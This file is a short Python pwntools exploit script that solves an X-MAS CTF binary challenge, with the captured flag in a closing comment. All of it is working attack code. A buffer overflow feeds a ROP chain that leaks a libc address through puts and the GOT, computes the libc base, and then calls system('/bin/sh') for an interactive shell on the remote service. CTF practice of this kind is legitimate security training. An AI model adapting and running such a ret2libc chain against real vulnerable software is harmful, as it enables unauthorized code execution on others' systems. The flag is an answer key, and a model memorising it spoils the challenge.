from pwn import *

setvbuf_got=0x0000000000404030
puts_plt=0x0000000000401030
entry=0x401070
pop_rdi=0x0000000000401273
ret=0x000000000040101a
#p=process("./chall")
p=remote("challs.xmas.htsp.ro",12006)
payload=""
payload+="A"*18
payload+=p64(pop_rdi)
payload+=p64(setvbuf_got)
payload+=p64(puts_plt)
payload+=p64(entry)
p.recv()
p.sendline(payload)
p.recvuntil("ng...")
data=p.recvuntil("Hell")[1:-5]
leak=u64(data.ljust(8,"\x00"))

print hex(leak)
base=leak-0x0812f0

print "base :",hex(base)

system=base+0x04f440
bin_sh=base+0x1b3e9a

print "system :",hex(system)
print "bin/sh :",hex(bin_sh)


payload=""
payload+="A"*18
payload+=p64(ret)
payload+=p64(pop_rdi)
payload+=p64(bin_sh)
payload+=p64(system)
p.sendline(payload)
p.interactive()


"""
flag: X-MAS{700_much_5n0000w}
"""